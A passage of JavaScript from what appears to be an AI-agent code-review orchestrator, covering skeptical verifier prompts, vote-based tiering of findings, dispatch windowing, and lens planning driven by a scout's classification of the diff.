  // Off-schema votes are discarded BEFORE the arithmetic, not read as all-false (see isVerdictShaped).
  const v = live.filter(isVerdictShaped)
  const judged = decideTier(f, live, v)
  const discarded = live.length - v.length
  if (!discarded) return judged
  // THE MAXIMUM THINNING IS THE ONE THE COUNTER MUST NOT MISS. A panel whose EVERY returned vote was
  // off-schema is already routed to `unverified` by decideTier, whose `why` says exactly that — so
  // the clause below would be false twice over (no tier "stands on" anything, and the surviving
  // count is zero). But the discard is still the largest one there is, and dropping the flag here
  // made the counter read 0 for it: the flag is set, the sentence is not.
  if (judged['tier'] === 'unverified') return { ...judged, votesDiscarded: discarded }
  // ARITHMETIC, NOT A WORD FOR IT. The earlier phrasing said "a minority of the panel that answered"
  // unconditionally, which is false whenever the survivors are the larger half — at `verifyVotes: 3`
  // with one discard the verdict stands on 2 of 3. Only the share is named, and it is computed.
  const share = v.length * 2 < live.length ? 'a minority of' : v.length * 2 === live.length ? 'exactly half of' : 'most of'
  return {
    ...judged,
    votesDiscarded: discarded,
    why: `${judged['why']} (PANEL THINNED: ${discarded} of ${live.length} returned votes answered off-schema and were discarded before the arithmetic — this ${judged['tier']} stands on ${v.length} of ${live.length} returned votes, ${share} the panel that answered)`,
  }
}
// The round-local half of the clause above, for the ledger door. Like TRACKED_MARK, "this verdict
// stands on N of M votes" is a statement about the panel THIS round convened; carried into round N+1
// verbatim it describes a panel that never sat. Deliberately paren-free in its body so this stays a
// one-shot match.
const THINNED_CLAUSE = / \(PANEL THINNED: [^)]*\)/g
/** @type {Schema<BatchVerdictAnswer>} */
const BATCH_VERDICT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['verdicts'],
  properties: {
    verdicts: {
      type: 'array',
      description: 'one entry per finding in the batch, keyed by its index — every index must appear',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['index', 'refuted', 'citedLineMatches', 'reachable', 'premiseSupported', 'reason'],
        properties: {
          index: { type: 'integer' },
          refuted: { type: 'boolean' },
          citedLineMatches: { type: 'boolean' },
          reachable: { type: 'boolean' },
          premiseSupported: { type: 'boolean' },
          reason: { type: 'string' },
        },
      },
    },
  },
}
/** @param {Finding[]} group @param {Profile} profile */
function batchVerifyPrompt(group, profile) {
  const pfs = group.map((f, i) => {
    const pf = promptFields(f)
    return `--- FINDING ${i} ---
[${pf.severity}] ${pf.title}
  at ${pf.file || '?'}:${f['line'] || 0}
  why: ${sanitizeAttack(f['why'])}
  source: ${sanitizeAttack(f['source'])}${f['ruleId'] ? ` · rule ${pf.ruleId}` : ''}
  off-site evidence claimed: ${f['whereChecked'] ? pf.whereChecked : '(none — claims to be self-contained at the cited line)'}`
  }).join('\n')
  return `You are a skeptic verifying ${group.length} INDEPENDENT ${profile.lang} review findings in one pass. They are batched only to save cost — judge each ENTIRELY on its own evidence. Never let one finding's verdict influence another's, and never assume a batch "should" contain some proportion of real ones.

Open the cited file for EACH finding and judge it exactly as you would alone. Default to refuted=true when uncertain whether a technical claim holds.

REFUTATION RULE: refuted=true means the TECHNICAL CLAIM is false — the cited code does not contain the claimed defect. Context is NOT refutation: test/fixture-only, looks intentional, low impact — none of those justify refuted=true. Record that in reachable=false and reason.

Per finding, decide:
- citedLineMatches: does the cited file:line actually contain what the finding claims?
- reachable: production-reachable, or test/example/fixture-only? Reachability is about the ROUTE — a state reached by CONSTRUCTING the object directly (builder, \`new\`, a fixture) bypasses the validation the question is about and proves nothing about untrusted-input reachability.
- refuted: is the technical claim itself false?
- premiseSupported: name the one claim that, if false, makes the finding evaporate. If it lives outside the cited line, OPEN the claimed off-site evidence and check it shows that. false when the premise is off-site and the evidence is empty, wrong, or merely restates the cited line. Unsupported is NOT disproven — do not raise refuted for it.

${pfs}

Return {verdicts: [...]} with ONE entry per finding, each carrying its \`index\` (0..${group.length - 1}). Every index must appear — omitting one silently deletes a finding from the review.`
}
/** @param {Finding[]} items @param {Plan} plan @param {Profile} profile @param {string} gateProvenance */
async function verifyPool(items, plan, profile, gateProvenance) {
  // One breaker per verification pass, handed only to the dispatches this function windows. Its
  // lifetime is the pass: a profile's pass never inherits a window filled by another profile's,
  // whose API reachability it did not observe and whose deaths it cannot re-spend.
  const breaker = makeDeathBreaker()
  /** @type {{ individual: Finding[], batch: Finding[], skip: Finding[] }} */
  const route = { individual: [], batch: [], skip: [] }
  for (const f of items) route[verifyTier(f)].push(f)

  // What is ALREADY confirmed at a blocking severity, raised as the individual panel settles. A
  // batch thunk asks it at the moment it is about to dispatch, so the skip below can only ever rest
  // on evidence that has already come back — never on an expectation that a Critical will confirm.
  const floor = makeVerdictFloor()

  // Skipped tier: its OWN tier, `unverified` — not Suspected. Suspected means "a verifier looked and
  // the claim did not stand up confidently"; these were never looked at. Folding them into Suspected
  // made the two indistinguishable in the report AND put them in the refuteRate denominator, so a run
  // whose findings were mostly Low/Info reported a refutation rate diluted by items nothing refuted.
  /** @type {Finding[]} */
  const unverified = route.skip.map(f => ({
    ...f,
    tier: 'unverified',
    why: `${f['why']} (NOT VERIFIED: no verifier was spent on it — ${f['severity']} cannot change the verdict either way, so nothing here has been checked against the code)`,
  }))

  // Batched tier: group by file so one agent reads one file's context once.
  /** @type {Map<string, Finding[]>} */
  const byFile = new Map()
  for (const f of route.batch) {
    const k = f['file'] || '?'
    const at = byFile.get(k)
    if (at) at.push(f)
    else byFile.set(k, [f])
  }
  /** @type {Finding[][]} */
  const groups = []
  for (const [, fs] of byFile) for (let i = 0; i < fs.length; i += BATCH_SIZE) groups.push(fs.slice(i, i + BATCH_SIZE))

  // `notRun` is computed AFTER the window settles, from the findings that carry the unverified tier
  // — not pushed from inside one death branch. That placement is the fix: a list filled by whichever
  // branch remembered to push is exactly how the dominant death (a `null` answer) stayed out of the
  // verdict while the `.catch` branch was covered. Deriving it from the tier makes it impossible for
  // a new death path to reach the report as an inspection.
  // A whole group nothing judged, whatever killed it. The reason is a CLASS of death, not the
  // verbatim error text: the run record's `notRun` is ranked by exact string to surface repeated
  // fragility, and an error message (or a run-specific path) makes every entry unique and sinks the
  // real repeats — the same reason `uncoveredFiles` is ranked separately.
  const deadGroup = (/** @type {Finding[]} */ group, /** @type {string} */ why) => {
    const what = `the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} ${why}`
    log(`⚠️ [${profile.id}] ${what} — its ${group.length} finding(s) were NOT checked against the code; reported as unverified and excluded from the verification counters`)
    return group.map((/** @type {Finding} */ f) => NOT_VERIFIED(f, `${what}, so nothing checked this finding against the code`))
  }

  // Batched and individual verification look at DISJOINT findings — routing put each one in exactly
  // one bucket — so awaiting the batch wave before starting the individual one bought nothing but
  // latency. Measured on one run: batches ran +81..89min and individuals +89..102min, strictly
  // nose-to-tail. They are built as two thunk lists sharing ONE ordered work list, so the slowest
  // batch no longer holds up the first verifier — but that list is dispatched through a BOUNDED
  // SLIDING WINDOW rather than all at once, because the per-agent deadline is measured from DISPATCH
  // and an unbounded fan-out makes it fire on queue wait instead of on hanging. A window, not waves:
  // waves gave the same cap but re-introduced a barrier per wave (see VERIFY_WINDOW_AGENTS).
  // A group whose verifier was never bought because the verdict was already fixed at Block. It takes
  // the same route as a death AS FAR AS THE TIERS GO — the unverified tier, out of the refutation
  // denominator — and for the same reason: nothing here was checked against the code. What it does
  // NOT do is disappear, and what it does NOT do either is enter `notRun`: that list means "this ran
  // badly; re-run it" and drives the INCOMPLETE marker, while this is a deliberate saving a re-run
  // would simply make again. It travels in `savedByFloor` instead (see the return of verifyPool),
  // and converts into `notRun` only if the Block it was justified by fails to arrive.
  // `verifySkipped` is the flag that keeps the two apart, since they need a re-run for opposite
  // reasons.
  const floorSkippedGroup = (/** @type {Finding[]} */ group) => {
    log(`💰 [${profile.id}] the batch verifier for ${/** @type {Finding} */ (group[0])['file'] || '?'} was NOT dispatched — ${floorSkipReason(floor)}; its ${group.length} finding(s) are reported as unverified and excluded from the verification counters`)
    return group.map((/** @type {Finding} */ f) => ({ ...NOT_VERIFIED(f, floorSkipReason(floor)), verifySkipped: true }))
  }

  const batchThunks = groups.map(group => () =>
    // Asked HERE, inside the thunk, not when the thunk list is built: the window dispatches lazily
    // and the individual panel goes first, so by the time a batch's turn comes the floor may have
    // been raised by a Critical that has actually come back confirmed. Asked at build time it would
    // always answer no, and the whole population would be bought.
    (verdictNeutralNow(group[0], floor)
      ? Promise.resolve(floorSkippedGroup(group))
      : ragent(batchVerifyPrompt(group, profile), { label: `verify-batch:${/** @type {Finding} */ (group[0])['file'] || '?'}(${group.length})`, phase: 'Verify', breaker, schema: BATCH_VERDICT_SCHEMA, model: CULL_MODEL })
      .then(res => {
        // THE DISCRIMINATOR. `ragent` answers `null` for a dead agent (API error, skip, or the
        // per-agent deadline) after its one re-dispatch, and that is the DOMINANT death — not the
        // throw the `.catch` below handles. An answer carrying no verdicts at all is the same
        // outcome by a different route: nothing was judged. Either way the group is unverified.
        const death = batchDeath(res)
        if (death) return deadGroup(group, death)
        return group.map((/** @type {Finding} */ f, /** @type {number} */ i) => {
          // `death` is null only for an answer carrying a non-empty verdict list, so `res` is set here.
          const v = (res?.verdicts ?? []).find(x => x && x['index'] === i)
          // A missing index in a NON-EMPTY verdict list is a verifier that ran and lost one finding —
          // an inspection happened, so this keeps `suspected`. This is the one case that must NOT be
          // folded into the unverified tier, and the only thing that separates it from a death.
          return v ? tierFromVotes(f, [v]) : { ...f, tier: 'suspected', why: `${f['why']} (batch verifier returned no verdict for this finding)` }
        })
      })
      // A batch verifier that THREW — both `ragent` attempts failed — judged nothing, so its group
      // belongs in `unverified`, exactly where the skipped Low/Info go, and by the same reasoning:
      // `suspected` is a claim that a verifier LOOKED and could not confirm, and the report now says
      // so in those words. Marking a dead verifier's findings suspected made the report assert an
      // inspection that never happened, and left up to BATCH_SIZE findings inside the `totalVerified`
      // denominator that is defined as what verification actually judged. One tier, one way in.
      // The verbatim error text is deliberately NOT carried into the finding or into `notRun`: see
      // the note on `deadGroup`. It is logged instead, where a unique string costs nothing.
      .catch((/** @type {unknown} */ err) => {
        log(`⚠️ [${profile.id}] batch verifier threw: ${String((err && /** @type {{ message?: unknown }} */ (err).message) || err).slice(0, 160)}`)
        return deadGroup(group, 'died before returning any verdict')
      })))

  if (route.skip.length || groups.length) {
    log(`[${profile.id}] Verify routing: ${route.individual.length} individual · ${route.batch.length} batched into ${groups.length} agent(s) · ${route.skip.length} NOT VERIFIED (Low/Info cannot move the verdict; reported as unverified, excluded from the verification counters)`)
  }

  const individualThunks = route.individual.map(f => () => {
    // Anything not produced by a review lens came from a deterministic tool (gate seeds: clippy-pedantic, statix, deadnix, semgrep, …) — except dep-context, a reasoning seed (see isToolSource).
    const isTool = isToolSource(profile, f['source'])
    const isHigh = f['severity'] === 'Critical' || f['severity'] === 'High'
    const n1 = isHigh ? Math.max(1, plan.verifyVotes) : 1
    // Cull votes on the cheap model.
    const cull = (/** @type {number} */ i) => () =>
      ragent(verifyPrompt(f, i, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#c${i + 1}`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: CULL_MODEL })
    if (!isHigh) return parallel([cull(0)]).then(vs => tierFromVotes(f, vs))
    // A High/Critical always gets exactly one authoritative opus vote combined with the cull votes.
    const auth = () =>
      ragent(verifyPrompt(f, n1, isTool, gateProvenance, profile), { label: `verify:${f['file'] || '?'}:${f['line'] || 0}#auth`, phase: 'Verify', breaker, schema: VERDICT_SCHEMA, model: plan.lensModel })
    // Open with the DECIDING pair — one cheap cull plus the authoritative vote — and buy the remaining
    // cull votes only when those two disagree. tierFromVotes is a majority rule, so a unanimous pair
    // lands on exactly the tier a unanimous four would: the extra votes only ever change the outcome
    // when there is a split to break. Measured justification: on a security-sensitive Rust diff
    // verifyVotes is forced to 3, so every High cost 4 agents — 72 of one run's 137 — while the whole
    // verification pass refuted 3% of candidates. Nearly all of those votes were re-confirming an
    // already-unanimous verdict. When they DO split, the escalation restores the full n1+1 panel, so
    // no contested finding is decided on thinner evidence than before.
    return parallel([cull(0), auth]).then(async vs => {
      const opening = vs.filter(Boolean)
      if (opening.length === 2 && votesAgree(opening[0], opening[1])) return tierFromVotes(f, opening)
      const rest = await parallel(Array.from({ length: Math.max(0, n1 - 1) }, (/** @type {unknown} */ _unused, /** @type {number} */ i) => cull(i + 1)))
      return tierFromVotes(f, opening.concat(rest.filter(Boolean)))
    })
  })
  // A batch thunk resolves to an ARRAY of judged findings (one per finding in the group), an
  // individual thunk to a single one — flatten the batch side back out before merging. The window
  // settles out of order but writes each result at ITS OWN index, so the positional split below
  // stays exactly as valid as it was under one parallel().
  //
  // INDIVIDUALS LEAD, and that ordering is the load-bearing part of the Medium economy above. The
  // window still has no barrier — the two tiers overlap freely — but it dispatches in list order, so
  // the Critical/High panel that can raise the verdict floor goes out first and a batch's turn comes
  // after some of it has come back. Batches first would ask the floor before anything could have
  // raised it, and the answer would always be "not yet".
  // Every settled individual verdict is offered to the floor. Wrapped here rather than inside the
  // thunk because the thunk has two return points, and a floor raised on one path but not the other
  // is the kind of half-wiring that leaves the saving silently unrealized.
  // `run` is `individualThunks[i]` for an in-range `i` (both lists map `route.individual`), hence the
  // cast; the result is typed as a window entry's so the batch thunks concatenate onto the same list.
  /** @type {(run: (() => Promise<Finding>) | undefined) => () => Promise<Finding | Finding[]>} */
  const withFloor = run => () => Promise.resolve(/** @type {() => Promise<Finding>} */ (run)()).then(r => {
    if (floor.record(r)) log(`💰 [${profile.id}] the verdict is now fixed at Block by a confirmed ${r.severity} (${r.file || '?'}:${r.line || 0}) — Medium batches not yet dispatched can no longer move it and will not be bought`)
    return r
  })
  const entries = route.individual.map((f, i) => ({ run: withFloor(individualThunks[i]), weight: verifyWeight(f, plan) }))
    .concat(batchThunks.map(run => ({ run, weight: 1 })))
  const totalWeight = entries.reduce((n, e) => n + e.weight, 0)
  if (totalWeight > VERIFY_WINDOW_AGENTS) {
    log(`[${profile.id}] Verify dispatched through a sliding window of ≤${VERIFY_WINDOW_AGENTS} agents (${totalWeight} worst-case agents queued) — a deeper queue makes the per-agent deadline fire on waiting rather than on hanging; the window refills as each verifier settles, so nothing waits on a batch's slowest member`)
  }
  // parallel([run]) per entry, not one parallel() over all of them: it is the sandbox primitive that
  // turns a throwing thunk into null, and a single-thunk barrier is no barrier at all.
  const settledVerdicts = await weightedWindow(entries, VERIFY_WINDOW_AGENTS, run => parallel([run]).then(rs => rs[0]))
  // Death #6: `weightedWindow` writes `null` at an entry's own index when its promise rejected, and
  // `.filter(Boolean)` used to DELETE those findings outright — out of every tier, out of the
  // denominator AND out of `notRun`, so the report simply never mentioned them. A null is recovered
  // back into its own findings by index (the batch side knows its group, the individual side its
  // finding) and routed exactly like every other death.
  const judged = settledVerdicts.slice(0, route.individual.length)
    // The first `route.individual.length` entries are individual thunks, each settling to ONE finding.
    .map((r, i) => (/** @type {Finding | null | undefined} */ (r) || NOT_VERIFIED(/** @type {Finding} */ (route.individual[i]), 'the verifier panel for this finding was lost before it settled — nothing was checked against the code')))
  const batched = settledVerdicts.slice(route.individual.length)
    // ...and the rest are batch thunks, each settling to its group's judged findings.
    .flatMap((r, i) => (r ? /** @type {Finding[]} */ (r) : deadGroup(/** @type {Finding[]} */ (groups[i]), 'was lost before it settled (its dispatch never produced a result)')))
  /** @type {Finding[]} */
  const settled = judged.concat(batched)
  // A dead batch's findings arrive through the same list as judged ones and must leave it again:
  // `vp` is the JUDGED population and every count derived from it (candidates, refuteRate) means
  // "what verification actually examined".
  const vp = settled.filter(f => f.tier !== 'unverified')
  const deaths = settled.filter(f => f.tier === 'unverified')
  const refuted = vp.filter(f => f.tier === 'refuted')
  return {
    confirmed: vp.filter(f => f.tier === 'confirmed'),
    suspected: vp.filter(f => f.tier === 'suspected'),
    // Kept OUT of `vp` on purpose, from both of its sources: the Low/Info nothing was spent on, and
    // the groups whose batch verifier died.
    unverified: unverified.concat(deaths),
    // DERIVED from the tier, not pushed by whichever branch remembered to. Grouped by file and
    // ranked-friendly: one stable string per (profile, file), no error text, no run-specific path.
    // THE ONE THINNING THAT LEAVES NO TRACE. A refuted finding is deleted from the run — out of
    // every tier and out of the report — so when its panel was thinned, the partial evidence it was
    // deleted on is visible nowhere: no finding to carry the clause, no mark, and a verdict that
    // reads clean. `notRun` is the existing mechanism for "this ran badly; re-run it", and it drives
    // the INCOMPLETE marker. DERIVED from the tier plus the flag tierFromVotes sets, like the
    // deaths above, and grouped by (profile, file) so the exact-string ranking in
    // lib/analyze-runs.mjs sees a repeat rather than a run-unique row.
    notRun: [...new Set([
      // THREE failures, kept apart by the same discipline that keeps error text out of the strings.
      // This list is ranked by exact string across runs, so collapsing any two makes one repeat
      // masquerade as another and sends the repair to the wrong place. A death is fragility a re-run
      // can fix; an off-schema panel ANSWERED and must not be called a death; a thinned refutation
      // deleted a finding on partial evidence. The deliberate floor skip is NOT here — see
      // `savedByFloor` below for why it cannot be.
      // Split on the flags tierFromVotes and floorSkippedGroup set, not on the wording of any `why`.
      ...deaths.filter(f => !f.verifySkipped && !((f.votesDiscarded ?? 0) > 0)).map(f => `${profile.id} verification of ${f.file || '?'} — the verifier(s) died before returning a verdict, so those finding(s) were never checked against the code`),
      ...deaths.filter(f => !f.verifySkipped && (f.votesDiscarded ?? 0) > 0).map(f => `${profile.id} verification of ${f.file || '?'} — every returned vote answered OFF-SCHEMA and was discarded before the arithmetic, so those finding(s) were never checked against the code`),
      ...refuted.filter(f => (f.votesDiscarded || 0) > 0).map(f => `${profile.id} verification of ${f.file || '?'} — a finding was REFUTED and deleted from the run by a THINNED PANEL (at least one returned vote answered off-schema and was discarded), so the deletion rests on partial evidence`),
    ])],
    // OUT of `notRun` on purpose, and this is the same call that was already made once for
    // `uncoveredFiles`. `notRun` means "this ran badly; re-run it": it drives the INCOMPLETE marker
    // on the verdict line, and lib/analyze-runs.mjs ranks it by exact string to surface repeated
    // FRAGILITY. A floor skip is the opposite of fragility — it is a deliberate, reproducible
    // saving that a re-run will simply make again. Left inside, it would do two kinds of damage,
    // both of them silent: every Block run carrying a batched Medium (the ordinary case) would
    // render as "⚠️ INCOMPLETE — coverage was partial … findings may be undercounted", which is a
    // false statement about coverage and, through rust-audit's leading-⚠️ rule, can pull a whole
    // audit down to Warning; and this string would become the most frequent row in the fragility
    // ranking, sinking the genuine repeats the ranking exists to surface. The findings themselves
    // are not hidden by this: they stay in the `unverified` tier, out of the refutation
    // denominator, and each carries its own `why` into the report's Unverified section.
    // Read across runs by lib/analyze-runs.mjs, which ranks it separately from the failures.
    savedByFloor: [...new Set(deaths.filter(f => f.verifySkipped).map(f => `${profile.id} verification of ${f.file || '?'} — deliberately not dispatched: the verdict was already fixed at Block, and no judgement on a Medium can move it, so those finding(s) were never checked against the code`))],
    dropped: refuted.length,
    refuted,
  }
}

// Rigor is a function of the size bucket, not a model's opinion: the scout classifies (sizeBucket,
// lenses, securitySensitive, …) and the script budgets. `lensModel` is a constant — review reasoning
// runs on Opus at every size; depth scales via rounds, votes and lens count.
const RIGOR_BY_SIZE = {
  small: { maxRounds: 1, verifyVotes: 1 },
  medium: { maxRounds: 2, verifyVotes: 1 },
  large: { maxRounds: 3, verifyVotes: 3 },
}
const LENS_MODEL = 'opus'

// ---- the per-profile plan: the scout's classification, then every floor and gate, in this order ----
// Lenses a BLANKET expansion of the roster must not include. A lens is a full agent — the
// dominant per-run cost — and `failure-windows` is the heaviest in the Rust roster: it enumerates
// every mutating request on the changed path and plays out each adjacent pair. Its premise is a
// code shape (a controller / reconcile loop), and its gate is the `reconciler` lens below. But it
// also sits in `profile.lenses`, so every blanket fill of that list — the security-sensitive
// rigor floor, the empty-lens fallback, and the conservative plan used when the scout DIED —
// bought it on any Rust diff at all, which is the opposite of "find more without paying hugely".
// A blanket fill is a statement of IGNORANCE about the diff, and ignorance is not this lens's
// signal. The scout may still pick it deliberately; only the floors may not.
// `admittedLens` is the ONE gate the optional set passes through, and it must sit under EVERY path
// into the plan — the scout's own picks, the blanket fills, and therefore the security floor and
// the empty-lens fallback that call `blanketLenses()`. There is a fourth path, far later and easy to
// miss: the completeness critic on the synthesis phase, which composes from the lenses NOT
// selected — by construction the whole optional set. It went ungated once and bought two of the
// three on an ordinary large diff. It calls `admittedLens` too now; putting the gate anywhere but
// under each of these leaves a door, because every one of them names lenses on its own signals.
/** Whether a lens may enter the plan at all: the optional set only by an explicit request. @param {string} l */
function admittedLens(l) {
  return !OPTIONAL_LENSES.includes(l) || optionalRequested.includes(l)
}

/** The profile's roster as a blanket fill takes it: no conditional lens, nothing unrequested. @param {Profile} profile @returns {string[]} */
function blanketLenses(profile) {
  return profile.lenses.filter((/** @type {string} */ l) => !CONDITIONAL_LENSES.includes(l) && admittedLens(l))
}

/** @param {ScoutAnswer | null} scout @returns {keyof typeof RIGOR_BY_SIZE} */
function rigorSize(scout) {
  // hasOwn, not truthiness: a bucket of "constructor" would index Object.prototype and pass.
  return /** @type {keyof typeof RIGOR_BY_SIZE} */ (Object.hasOwn(RIGOR_BY_SIZE, scout?.sizeBucket ?? '') ? scout?.sizeBucket : 'medium')
}

/** The lenses the scout picked that the roster has and the gate admits; a blanket fill when it picked none. @param {Profile} profile @param {ScoutAnswer | null} scout @returns {string[]} */
function scoutPickedLenses(profile, scout) {
  return scout?.lenses?.length ? scout.lenses.filter((/** @type {string} */ l) => profile.lenses.includes(l) && admittedLens(l)) : blanketLenses(profile)
}

/** @param {Profile} profile @param {ScoutAnswer | null} scout @param {keyof typeof RIGOR_BY_SIZE} size @returns {Plan} */
function initialPlan(profile, scout, size) {
  return {
    sizeBucket: size,
    lenses: scoutPickedLenses(profile, scout),
    maxRounds: RIGOR_BY_SIZE[size].maxRounds,
    verifyVotes: RIGOR_BY_SIZE[size].verifyVotes,
    lensModel: LENS_MODEL,
    isLibrary: profile.usesLibrary ? (scout?.isLibrary ?? false) : false,
    securitySensitive: scout?.securitySensitive ?? true,
    intent: scout?.intent ?? intentArg,
    spec,
    churn: scout?.churn ?? [],
  }
}

/** Adds a lens the plan lacks. @param {Plan} plan @param {string} l */
function addMissingLens(plan, l) {
  if (!plan.lenses.includes(l)) plan.lenses.push(l)
}

/** Adds a lens the plan lacks, if the profile's roster offers it. @param {Profile} profile @param {Plan} plan @param {string} l */
function addOfferedLens(profile, plan, l) {
  if (profile.lenses.includes(l)) addMissingLens(plan, l)
}

/** The lenses the plan must carry whatever the scout picked: the always set, and those the scout's own signals call for. @param {Profile} profile @param {ScoutAnswer | null} scout @param {Plan} plan */
function addRequiredLenses(profile, scout, plan) {
  // "Always" lenses are enforced HERE, not left to the scout: smoke runs showed prompt-side
  // "always include X" gets dropped. 'intent' is the lens that catches correct-looking code
  // with wrong behavior — it runs at every size.
  for (const l of (profile.alwaysLenses || [])) addOfferedLens(profile, plan, l)
  // `reconciler` in the plan IS the signal that this is controller code, and controller code is
  // where the windows between two committed writes live. Enforced here rather than in the scout
  // prompt for the same measured reason as the alwaysLenses loop above: a prompt-side "also include"
  // gets dropped, and a lens that silently did not run renders as a clean pass.
  // The signal is the SCOUT having chosen `reconciler` after reading the diff — not `reconciler`
  // merely being present in the plan. A blanket fill puts it there on every Rust diff, so reading
  // the plan let the floors back in through the gate's own door: the check passed, and the
  // conditional lens was conditional on nothing.
  const scoutedReconciler = Array.isArray(scout?.lenses) && scout.lenses.includes('reconciler')
  if (scoutedReconciler) addOfferedLens(profile, plan, 'failure-windows')
  if (strict) addOfferedLens(profile, plan, 'maintainability')
}

/** The rigor floors: security, the size-driven lenses, and an explicit optional request. @param {Profile} profile @param {Plan} plan */
function addRigorFloors(profile, plan) {
  // Security-sensitive rigor floor: don't let the size heuristic gate rigor on a security-touching change.
  if (plan.securitySensitive) applySecurityFloor(profile, plan)
  // Negative-space lens where new reachable surface tends to appear.
  if (plan.securitySensitive || plan.sizeBucket === 'large') addMissingLens(plan, 'negative-space')
  // Compat lens on large diffs too: changed serialized/persisted representations break other-versioned
  // readers (rolling deploy, already-stored rows) invisibly to the code-intrinsic lenses. Security-sensitive
  // diffs already get it via the all-lenses floor above (compat ∈ profile.lenses).
  if (plan.sizeBucket === 'large') addOfferedLens(profile, plan, 'compat')
  // A changed contract path (lib/contract-paths.mjs) ADDS compat at every size: a chart, CRD, IDL,
  // migration or plugin manifest is deployed or called against by other versions whatever the diff's
  // size, and the surface gate below then keeps it, since the same paths force `wireForm` on.
  if (changedFiles.some(isContractOrSchemaPath)) addOfferedLens(profile, plan, 'compat')
  // An explicit request ADDS the lens; it does not merely permit it. A caller who writes
  // `optional=performance` is asking for the performance pass to RUN, not for the scout to be
  // allowed to pick it — and on a small diff with no security floor nothing else would ever put it
  // in the plan, so "permit" would have meant "nothing happens". Enforced in code, for the same
  // measured reason as the alwaysLenses loop above.
  for (const l of optionalRequested) addOfferedLens(profile, plan, l)
}

/** @param {Profile} profile @param {Plan} plan */
function applySecurityFloor(profile, plan) {
  for (const l of blanketLenses(profile)) addMissingLens(plan, l)
  plan.verifyVotes = Math.max(plan.verifyVotes, 3)
  plan.maxRounds = Math.max(plan.maxRounds, 2)
}

/** Drops each surface-gated lens whose surface the scout said is absent; returns what it dropped. @param {ScoutAnswer | null} scout @param {Plan} plan @returns {string[]} */
function applySurfaceGate(scout, plan) {
  // realm @nick/craft #102: surface gate — the LAST word on plan.lenses, sitting AFTER every floor
  // that can add negative-space/compat/invariants (the scout's picks, the security/large floors, the
  // optional request above). Each of those three fires only where the diff touches the surface its
  // defect class needs; here that surface is read and the lens dropped only where the scout said the
  // surface is absent. FAIL-OPEN: an undefined or true surface KEEPS the lens.
  const surfaces = { ...(scout?.surfaces || {}) }
  // Certain cross-boundary paths the scout can miss force their surfaces ON — never off, so this only
  // ever adds a lens back, never removes one.
  if (changedFiles.some(isContractOrSchemaPath)) { surfaces.crossBoundarySymbol = true; surfaces.wireForm = true }
  /** @type {string[]} */
  const surfaceDropped = []
  plan.lenses = plan.lenses.filter(lens => {
    const need = SURFACE_GATED_LENSES[lens]
    if (!need) return true
    if (surfaces[need] === false) { surfaceDropped.push(lens); return false }
    return true // fail-open: undefined/true keeps the lens
  })
  return surfaceDropped
}

/** @param {Profile} profile @param {ScoutAnswer | null} scout @returns {{ plan: Plan, surfaceDropped: string[] }} */
function planFromScout(profile, scout) {
  const plan = initialPlan(profile, scout, rigorSize(scout))
  if (!plan.lenses.length) plan.lenses = blanketLenses(profile)
  addRequiredLenses(profile, scout, plan)
  addRigorFloors(profile, plan)
  const surfaceDropped = applySurfaceGate(scout, plan)
  return { plan, surfaceDropped }
}

/** @param {Profile} profile @param {ScoutAnswer | null} scout @param {Plan} plan */
function logScoutPlan(profile, scout, plan) {
  log(`[${profile.id}] ${!scout ? '⚠️ scout did not return — conservative fallback plan' : (scout.notes || 'scout: classified')} · ${plan.sizeBucket}${plan.securitySensitive ? ' · SECURITY floor (all lenses, 3-vote)' : ''}${plan.lenses.includes('negative-space') ? ' · +negative-space' : ''}`)
}

// ================= Per-profile pipeline: scout → gate → lenses → verify → critic =================
/** The single dispatch point's record of what ran, for the optional and surface-gate tallies. @param {string} lens */
function noteLensDispatched(lens) {
  // The single dispatch point for every lens on every path. Recording here — not at plan time — is
  // what makes the report and the run record physically unable to disagree with what happened.
  if (OPTIONAL_LENSES.includes(lens)) optionalDispatched.add(lens)
  // realm @nick/craft #102: mirrors the line above — a surface-gated lens that actually ran in ANY
  // profile is subtracted from the reported/recorded "dropped" set by surfaceGateTally().
  if (SURFACE_GATED_LENSES[lens]) surfaceGateDispatched.add(lens)
}

/** The preflight pass and its declared-probe audit, both logged. @param {Profile} profile */
async function runPreflight(profile) {
// Cheap and first: resolve the runner, the compile blockers and what CI already covers, so the gate
// spends its time on signals rather than on discovering its own environment. Best-effort by design —
// a preflight that dies just leaves the gate to work it out the old way.
const preflight = await ragent(preflightPrompt(profile, { baseRef }),
  // 5min, not the phase default. Three numbers set it, and the deadline must clear ALL of them:
  //  · the prompt declares a 3min ceiling, and a deadline at twice that makes the budget advisory —
  //    nothing then stops a pass that ignores the ceiling. 5min stays under 2x and keeps it real.
  //  · the measured cost of an earlier version of this pass was 207s, ALREADY past three minutes.
  //  · the clock starts at DISPATCH, not at execution, so it covers queue wait PLUS the run.
  // A deadline between those last two (210000 did exactly this) times out work that would have
  // landed. Losing preflight is survivable — the gate re-establishes everything itself, the slow
  // way — so the bound is set above the measured cost rather than tight against it.
  // THE COST ARGUMENT THAT USED TO STAND HERE IS NO LONGER TRUE, and the constant survives it.
  // It read: a miss costs TWO dispatches, because `ragent` abandoned the wait and re-dispatched
  // with a fresh deadline, so a hung pass burned up to 10min. The deadline is now ONE budget
  // shared by the attempts, and a deadline fire spends it by definition — so a miss costs one
  // dispatch and at most these 5 minutes, and the second attempt exists only for the fast death
  // that leaves budget behind. 300000 is therefore now a straightforwardly bounded 5min ceiling,
  // not a 10min one accepted as a trade.
  { label: `preflight:${profile.id}`, schema: PREFLIGHT_SCHEMA, phase: 'Gate', model: 'haiku', effort: 'low', deadlineMs: 300000 })
// The declared-probe audit. Named in the log and carried into the record so a breach of the
// "ask each source once" rule is a fact of the run rather than a matter of the prompt's manners.
const probeViolations = auditPreflightProbes(preflight)
if (probeViolations.length) {
  log(`⚠️ [${profile.id}] PREFLIGHT PROBE BUDGET BREACHED (${probeViolations.length}): ${probeViolations.join(' · ')}`)
}
if (preflight) {
  log(preflightLine(profile, preflight))
} else {
  // Never silent: no preflight line at all would read as "this run had no preflight step".
  log(`⚠️ [${profile.id}] Preflight unavailable (failed or passed its deadline) — the gate establishes the environment itself, and its provenance says so.`)
  // DELIBERATELY NOT `notRun`, unlike a dead scout. `notRun` drives the INCOMPLETE verdict and
